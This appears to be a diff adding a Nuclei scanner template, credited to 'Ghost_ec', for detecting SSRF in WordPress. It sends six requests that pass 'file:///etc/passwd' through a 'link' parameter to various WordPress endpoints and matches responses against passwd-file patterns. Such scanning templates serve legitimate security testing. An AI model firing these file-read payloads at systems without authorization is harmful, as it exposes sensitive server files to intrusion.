@@ -1,0 +1,50 @@
+id: SSRF
+
+info:
+  name: SSRF Detection in WordPress
+  author: Ghost_ec
+   # ____ _               _                   
+# / ___| |__   ___  ___| |_   ___  ___  ___ 
+#| |  _| '_ \ / _ \/ __| __| / __|/ _ \/ __|
+#| |_| | | | | (_) \__ \ |_  \__ \  __/ (__ 
+ #\____|_| |_|\___/|___/\__| |___/\___|\___|
+  severity: critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?p=3232&wp_automatic=download&link=file:///etc/passwd"
+      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=some_action&link=file:///etc/passwd"
+      - "{{BaseURL}}/wp-json/wp/v2/media?link=file:///etc/passwd"
+      - "{{BaseURL}}/wp-json/wp/v2/posts?link=file:///etc/passwd"
+      - "{{BaseURL}}/wp-json/wp/v2/users?link=file:///etc/passwd"
+      - "{{BaseURL}}/wp-includes/rest-api/endpoints.php?link=file:///etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"link":"file:'
+          - '"content":"'
+          - '"data":'
+
+      - type: regex
+        regex:
+          - "root:[^:]*:[0-9]+:[0-9]+:[^:]*:[^:]*"
+          - "bin/bash"
+          - "bin/sh"
+
+      - type: status
+        status:
+          - 200
+          - 403
+          - 500
+
+    extractors:
+      - type: regex
+        regex:
+          - "link\":\"file:(.*)\""
+
+    headers:
+      User-Agent: Nuclei-SSRF-Detection
